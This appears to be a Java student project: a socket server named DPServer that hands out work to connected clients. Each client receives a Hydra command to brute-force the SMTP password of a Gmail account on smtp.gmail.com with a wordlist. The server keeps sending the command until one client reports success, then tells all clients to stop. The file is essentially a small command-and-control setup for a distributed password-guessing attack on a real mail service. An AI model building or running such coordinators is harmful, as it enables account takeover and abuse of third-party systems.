 /*
* To change this license header, choose License Headers in Project Properties.
* To change this template file, choose Tools | Templates
* and open the template in the editor.
*/
package dagitik_sistem;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
*
* @author haye
*/
public class DPServer extends Thread{

static int port = 15201;
static Socket sockets[] = new Socket [10];
static BufferedReader bfs[] = new BufferedReader[10];
static PrintWriter pws[] = new PrintWriter[10];
static long sonuc;
static boolean araniyor = true;


static int i = 0;
public static void main(String[] args) throws IOException {

ServerSocket serverSocket = new ServerSocket(port);

new DPServer().start();

while(araniyor) {
System.out.println("Baglantiya hazir");
Socket a = serverSocket.accept();


bfs[i] = new BufferedReader(new InputStreamReader(a.getInputStream()));
sockets[i] = a;

pws[i] = new PrintWriter(a.getOutputStream(), true);

System.out.println("Baglandi");
pws[i].println(komutGonder());

i++;
}
}

public static String komutGonder() {
return "hydra -S -l smtptest.ha@gmail.com -P pass.lst -V -s 465 smtp.gmail.com smtp";
}

public void run () {

while(true) {
for(int j=0; j<10; j++) {
try {
if(bfs[j] != null  && bfs[j].ready()){
String c1 = bfs[j].readLine();
System.out.println(c1);

if(c1.contains("success")){
araniyor = false;
System.out.println(c1);

//hepsine bitir cevabı gönder
for(int k=0; k<i; k++){
pws[k].println("bitir");
}

this.stop();
}else {
pws[j].println(komutGonder());
}
}   
} catch (IOException ex) {
Logger.getLogger(DPServer.class.getName()).log(Level.SEVERE, null, ex);
}
}

}

}
}